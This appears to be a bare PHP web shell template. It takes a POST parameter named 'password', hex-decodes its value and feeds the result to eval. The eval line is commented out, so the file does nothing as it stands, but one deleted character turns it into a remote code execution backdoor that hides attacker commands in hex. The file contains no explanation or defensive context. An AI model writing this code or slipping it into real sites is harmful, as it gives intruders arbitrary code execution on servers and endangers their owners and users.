<?php 
$string = '';
$password = 'password';
if(isset($_POST[$password])){
    $hex = $_POST[$password];
    for($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
}
#eval($string);
?>
